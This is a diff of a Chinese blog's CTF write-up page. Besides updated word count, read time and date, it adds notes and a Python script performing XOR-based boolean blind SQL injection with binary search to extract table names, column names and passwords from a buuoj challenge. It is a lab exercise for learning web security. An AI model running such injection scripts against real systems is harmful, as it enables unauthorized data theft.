@@ -414,13 +414,13 @@
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：3.6k字</p>
+      <p>字数：4k字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：16分钟</p>
+      <p>时长：18分钟</p>
     </a>
   </div>
 
@@ -705,6 +705,20 @@ Syc&#123;D0_Y0u_l0v3_M3???&#125;</code></pre>
 <p><img src="/2019/11/06/syc-ctf-wp/20191117212655.png"></p>
 <p>二分法脚本：</p>
 <p><img src="/2019/11/06/syc-ctf-wp/20191117212626.png"></p>
+<p>上面是抄别人的wp 自己做下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search.php?id&#x3D;1</span><br><span class="line">search.php?id&#x3D;2-1</span><br></pre></td></tr></table></figure>
+
+<p>两处回显结果一样 说明可能有注入 fuzz一下关键字  在buu注意要修改线程还有延时</p>
+<p><img src="/2019/11/06/syc-ctf-wp/image-20210212135321687.png" alt="image-20210212135321687"></p>
+<p>长度为890的都过滤了</p>
+<p><img src="/2019/11/06/syc-ctf-wp/image-20210212135429458.png" alt="image-20210212135429458"></p>
+<p>也不太多 直接异或注入吧 空格过滤使用括号 ord ascii没有过滤 if过滤了 不用也行 可以二分bool盲注 写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies =&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://984cd692-e1ae-42fc-aceb-4efd0170059a.node3.buuoj.cn/search.php?id=1&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload1=&quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        <span class="comment"># payload2=&quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        <span class="comment"># payload1=&quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        <span class="comment"># payload2=&quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        payload1=<span class="string">&quot;^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;&#125;,1))=&#123;&#125;)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        payload2=<span class="string">&quot;^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+payload1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ERROR！！！&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+payload2)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
           
             <div class='article_footer'>
@@ -761,10 +775,10 @@ Syc&#123;D0_Y0u_l0v3_M3???&#125;</code></pre>
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-16T17:02:51+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-12T14:46:48+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2020年5月16日</p>
+    <p>更新于：2021年2月12日</p>
   </a>
 </div>
 
